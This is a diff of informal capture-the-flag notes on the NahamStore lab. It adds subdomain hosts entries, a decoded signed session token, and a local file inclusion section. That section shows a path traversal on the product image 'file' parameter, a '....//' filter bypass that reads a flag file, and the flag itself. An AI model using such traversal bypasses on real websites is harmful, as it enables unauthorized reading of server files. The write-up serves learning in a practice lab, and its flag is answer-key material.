@@ -53,11 +53,9 @@ Haza!
     WWW          [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 7ms]
 
 (Adding these badboys to the hosts file)
-
+#(Quickly adding the copy and paste)# [Related IP] stock.nahamstore.thm marketing.nahamstore.thm shop.nahamstore.thm nahamstore-2020.nahamstore.thm www.nahamstore.thm
 aaaand:
-
     http://www.nahamstore.thm
-
 Beautiful, I can see something (maybe I could've done this before, IT DOESNT MATTER, I have vision)
 
 
@@ -71,13 +69,52 @@ Let's see if the sourcecode tells us something fancy!
 Nothing so far, but what if I just:
 
     http://nahamstore.thm/staff
-
 Fascinating, so we got Ben and Adam here. This certainly feels like something, but no Jimmy Jones, so let's put a pin in this.
-
 Looking around though, I fear I'm not on the right track, so let's look at:
 
-    stock.nahamstore.thm
+Looking around, I did find something interesting, when making an acount and looking trough the "change email tab" I found this hash:
+eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TnpnMk5qa3dORFF3SW4wPSIsInNpZ25hdHVyZSI6IjQwODliM2Y2ZjA4MjMyNjYzZDNhN2JhMjQxODBjMTgxIn0=
+    Which translates in base64 to:
+{"data":"eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNzg2NjkwNDQwIn0=","signature":"4089b3f6f08232663d3a7ba24180c181"}
+    and translating the date presents:
+        eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNzg2NjkwNDQwIn =
+            {"user_id":4,"timestamp":"1786690440"}
+So=
+{"data":"{"user_id":4,"timestamp":"1786690440"}","signature":"4089b3f6f08232663d3a7ba24180c181"}
+Anywyas, gonna keep this one for a bit
 
-and
+===================
+"Task - LFI"
+#===================
 
-    marketing.nahamstore.thm
+Found that the product image endpoint uses a `file` parameter:
+
+    http://nahamstore.thm/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg
+
+Tried the obvious path traversal:
+
+    ../../../../lfi/flag.txt
+
+but that doesn't work, presumably because `../` is being filtered.
+
+Then we can bypass this with:
+
+    ....//....//....//....//....//....//lfi/flag.txt
+
+The `....//` effectively gets around the filter and allows the application to resolve the path as directory traversal.
+
+Checking the raw response instead revealed:
+
+    {7ef60e74b711f4c3a1fdf5a131ebf863}
+
+So the process was essentially:
+
+    file parameter
+        ↓
+    Path Traversal / LFI
+        ↓
+    /lfi/flag.txt
+        ↓
+    Read the file contents
+        ↓
+    Flag: {7ef60e74b711f4c3a1fdf5a131ebf863}
